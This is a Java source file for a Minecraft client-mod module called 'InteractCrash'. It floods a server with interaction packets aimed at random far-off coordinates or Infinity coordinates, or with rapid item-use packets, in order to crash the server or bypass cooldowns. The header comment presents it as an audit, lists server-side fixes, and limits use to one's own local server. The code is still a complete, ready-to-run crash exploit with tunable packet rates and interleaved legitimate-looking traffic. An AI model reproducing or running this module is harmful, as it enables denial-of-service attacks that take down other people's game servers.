package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractItemC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

/**
 * AUDIT: Interact Crash (random / OOB / Infinity interaction coordinates)
 *
 * Three modes:
 *
 *   NoCom: floods block-use packets at random coordinates far from the player.
 *   Tests whether the server validates that the interaction target is within
 *   reach and that the resulting BlockPos is within world bounds before doing
 *   any world-state lookup.
 *
 *   OOB: sends a block-use packet with Infinity coordinates. BlockPos.ofFloored
 *   on Infinity produces Long.MAX_VALUE, which may trigger chunk-map lookups or
 *   crash numeric code downstream that expects finite coordinates.
 *
 *   Item: floods PlayerInteractItemC2SPacket at high rate. Tests whether
 *   item-use (right-click) is rate-limited independently of block interactions,
 *   and whether rapid item-use can bypass use/cooldown enforcement.
 *
 * Patch signal: validate that all incoming hit-result coordinates are finite
 * and within [worldMinY, worldMaxY] before BlockPos conversion; reject
 * out-of-reach and out-of-bounds interactions before world lookup; apply
 * per-type rate limits on both block-use and item-use packets.
 *
 * Run against your OWN local server only.
 */
public class InteractCrash extends Module {
    public enum Mode { NoCom, OOB, Item }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").defaultValue(Mode.NoCom).build()
    );
    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(15).min(1).sliderMax(100).build()
    );

    private final TestCadence cadence = new TestCadence(sgGeneral);
    private final PreStress preStress = new PreStress(sgGeneral);
    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private final Random random = new Random();

    public InteractCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "interact-crash",
            "Sends block/item interaction packets at random or out-of-bounds positions.");
    }

    private Vec3d randomPos() {
        return new Vec3d(random.nextInt(0xFFFFFF), 255, random.nextInt(0xFFFFFF));
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0;
        cadence.onActivate(); gr.onActivate(); preStress.onActivate(this);
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (!cadence.shouldFire()) return;
        switch (mode.get()) {
            case NoCom -> {
                for (int i = 0; i < amount.get(); i++) {
                    Vec3d p = randomPos();
                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                        Hand.MAIN_HAND, new BlockHitResult(p, Direction.DOWN, BlockPos.ofFloored(p), false), 0));
            packetsSent++;
                }
            }
            case OOB -> {
                Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255, Double.NEGATIVE_INFINITY);
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(
                        Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
                    packetsSent++;
                }
            }
            case Item -> {
                for (int i = 0; i < amount.get(); i++) {
                    mc.player.networkHandler.sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0, 0f, 0f));
                    packetsSent++;
                }
            }
        }
        gr.markFired();
        TestCadence.sendLegit(mc.player, cadence.legitRatio());
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            gr.report(l -> info("%s", l));
        }
        preStress.onDeactivate();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) { gr.onReceive(event.packet); }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
